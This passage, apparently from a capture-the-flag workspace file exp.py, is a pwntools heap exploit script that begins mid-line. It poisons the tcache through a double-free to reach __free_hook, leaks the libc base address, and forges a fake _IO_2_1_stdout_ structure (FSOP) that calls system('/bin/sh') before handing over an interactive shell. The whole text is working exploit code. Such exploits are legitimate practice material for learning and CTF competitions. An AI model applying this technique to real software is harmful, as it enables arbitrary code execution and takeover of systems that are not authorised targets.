ant(2, 0x100, b'c' * 8)       # pops A\ndefuse(2)                        # free A again -> tcache count 1\nrewire(0, p64(FREE_HOOK - 0x10)) # poison fd\nplant(3, 0x100, b'd' * 8)       # pops A (count back to 0)\nplant(4, 0x100, b'e' * 8)       # returns __free_hook\n\nleak = u64(inspect(4, 8))\nlibc = leak - LIBC.symbols['free']\nlog.success('free@libc = %#x -> base %#x' % (leak, libc))\nassert libc & 0xfff == 0, 'bad leak'\n\ndef write_at(addr, data):        # classic UAF double-free tcache win\n    plant(0, 0x100, b'a' * 8)\n    defuse(0)\n    rewire(0, p64(0))\n    plant(2, 0x100, b'c' * 8)\n    defuse(2)\n    rewire(0, p64(addr - 0x10))\n    plant(3, 0x100, b'd' * 8)\n    plant(4, 0x100, data)\n\n# ---------- stage 2: FSOP on stdout (_IO_2_1_stdout_) ----------\nio2 = libc + IO_2_1_STDOUT\nvtable = libc + 0x1ed5a0 + 0x38 - 0x10   # _IO_list_all+0x38 (writable libc data)\nfake  = flat(io2, 0, 0, 0, 0, 0, 0, 0)   # _flags, rd/wr ptrs, bases\nfake  = fake[:0x20] + p64(0) + p64(1) + fake[0x30:]  # write_ptr=1 -> flush on puts\nfake  = fake.ljust(0xd8, b'\\x00') + p64(vtable)\nfake  = fake.ljust(0xe0, b'\\x00') + p64(libc + SYSTEM)\nfake  = fake.ljust(0x100, b'\\x00') + b'/bin/sh\\x00'\n\nwrite_at(io2,        fake[:0x88])\nwrite_at(io2 + 0x88, fake[0x88:0x110])\nlog.success('fake _IO_2_1_stdout_ written')\n\nleave()\nio.interactive()\n", "path": "/home/ctfplayer/workspace/exp.py"}
